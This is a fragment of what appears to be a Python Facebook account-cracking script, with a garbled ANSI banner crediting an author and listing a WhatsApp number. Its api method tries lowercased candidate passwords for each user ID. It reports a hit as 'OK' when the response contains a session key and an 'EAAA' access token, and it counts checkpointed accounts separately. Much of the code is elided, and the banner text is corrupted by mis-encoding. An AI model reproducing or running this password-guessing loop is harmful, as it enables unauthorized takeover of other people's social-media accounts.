...
\033[1;93m  
    ...
    鈹� [鉁揮 AUTHOR   : Samjid Sheikh           鈹�
    鈹� [鉁揮 From:Tamai koliya para                鈹�
    鈹� [鉁揮 WHATSAPP : 01963643516        鈹�
    鈹� [鉁揮 POWER BY : \x1b[1;32mSAMJID\x1b[1;97m            鈹�
	...
	def api(self, uid, pwx):
		...
		sys.stdout.write(
			"\r\r %s\033[0;93m[SAMJID馃う鈥嶁檪锔廬 : \033[0;97m %s/%s -> \033[0;92m [OK馃槏:%s ]- \033[0;93m[CP馃樋:%s ]"%(B,self.loop, len(self.id), len(self.ok), len(self.cp))
		); sys.stdout.flush()
		for pw in pwx:
			pw = pw.lower()
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r \033[0;92m[SAMJID-OK馃槏] %s|%s\033[0;97m         "%(uid, pw))
